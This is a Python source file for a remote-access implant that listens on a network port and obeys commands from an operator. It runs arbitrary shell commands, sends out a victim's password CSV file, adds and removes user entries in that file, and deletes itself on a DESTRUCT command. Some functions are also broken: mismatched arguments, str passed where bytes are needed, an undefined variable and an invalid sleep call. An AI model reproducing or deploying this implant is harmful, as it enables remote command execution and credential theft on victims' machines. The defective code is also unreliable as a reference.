import csv
import os
import ssl
import subprocess
import sys
from csv import writer
from socket import *

import pandas as pd


def getCommand():
    implant_socket = socket(AF_INET, SOCK_STREAM)
    implant_socket.bind(("0.0.0.0", int(sys.argv[1])))
    implant_socket.listen()  
    connection_socket, client_address = implant_socket.accept()
    return connection_socket.recv(1024).decode().split(), connection_socket


def obfuscateSend(msg: str):
    connection_socket.send(msg.encode())


target = r"C:\Users\Victim\Downloads\userPasswords.csv"
# TODO make the scheduler run
while True:
    command, connection_socket = getCommand()

    if (command):
        obfuscateSend(f"COMMAND RECEIVED {command[0]}", connection_socket)

    if (command[0] == "RECON"):
        cmd = " ".join(command[1:])
        result = subprocess.check_output(cmd, shell=True)
        if result == b'':
            result = "empty STDOUT".encode()
        connection_socket.send(result)
    elif (command[0] == "SETPATH"):
        target = command[1]
    elif (command[0] == "DESTRUCT"):
        os.remove(sys.argv[0])
        connection_socket.send("SUCCESSFULLY REMOVED")
        exit()
    elif (command[0] == "FETCHALL"):
        with open(f"{target}", "rb") as file: 
            while True:
                bytes_read = file.read(1024)
                if not bytes_read:
                    break
                connection_socket.sendall(bytes_read)
            file.close()
    elif (command[0] == "ADDUSER"):
        with open(f"{target}", "r") as file:
            last_user_ID = file.readlines()[-1][0]
        new_user = [last_user_ID + 1, command[2], command[3]]
        with open(f"{target}", 'a') as file :
            write_obj = writer(file)
            write_obj.writerow(new_user)
            file.close()
    elif (command[0] == "REMOVEUSER"):
        df = pd.read_csv(f"{target}")
        df_s = df
        df_s = df_s.drop(df_s.query(f'USER_ID=={command[1]}').index)
        df_s.to_csv(f"{target}")

    elif (command[0] == "GETUSER"):
        connection_socket(df.loc[df['USER_ID'] == 'yellow'].encode())
    elif (command[0] == "SLEEP"):  # TODO make this do the Scheduler
        sys.argv[0].sleep(command[1])
